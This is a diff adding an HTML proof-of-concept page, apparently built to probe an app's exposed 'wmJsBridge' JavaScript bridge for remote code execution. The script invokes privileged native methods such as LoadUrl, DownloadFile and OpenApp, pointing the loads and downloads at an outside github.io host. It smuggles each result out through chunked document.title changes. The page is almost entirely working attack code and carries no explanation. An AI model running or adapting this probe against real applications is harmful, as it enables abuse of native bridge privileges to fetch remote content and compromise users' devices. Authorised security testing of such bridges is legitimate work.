@@ -1,0 +1,35 @@
+<!doctype html>
+<html><head><meta charset="utf-8"><title>WM-POC-P19X</title></head>
+<body><h1>P19X</h1>
+<script>
+function chunk(s){
+  s=String(s||'');
+  var n=180,i=0,p=0;
+  while(i<s.length){document.title='P19X-'+(++p)+'-'+s.slice(i,i+n);i+=n;}
+}
+function call(mod,meth,param){
+  return new Promise(function(res){
+    try{
+      if(!window.wmJsBridge||!wmJsBridge.invoke){res({e:'nojsb'});return;}
+      wmJsBridge.invoke(mod,meth,param||{},function(r){res({ok:r});},function(e){res({err:e});});
+    }catch(e){res({ex:String(e)});}
+  });
+}
+(async function(){
+  document.title='P19X-START';
+  chunk('H='+location.host+' P='+location.pathname);
+  var tests=[
+    ['OpenApiPlugin','CheckJsApiConfig',{}],
+    ['CommonPlugin','LoadUrl',{url:'https://gitwhs.github.io/wm-poc-rce/probe19x.html'}],
+    ['CommonPlugin','DownloadFile',{url:'https://gitwhs.github.io/wm-poc-rce/probe19x.html'}],
+    ['OpenAppPlugin','OpenApp',{appId:'1'}]
+  ];
+  for(var i=0;i<tests.length;i++){
+    var t=tests[i];
+    var r=await call(t[0],t[1],t[2]);
+    chunk(t[0]+'.'+t[1]+'='+JSON.stringify(r).slice(0,160));
+  }
+  document.title='P19X-DONE';
+})();
+</script>
+</body></html>
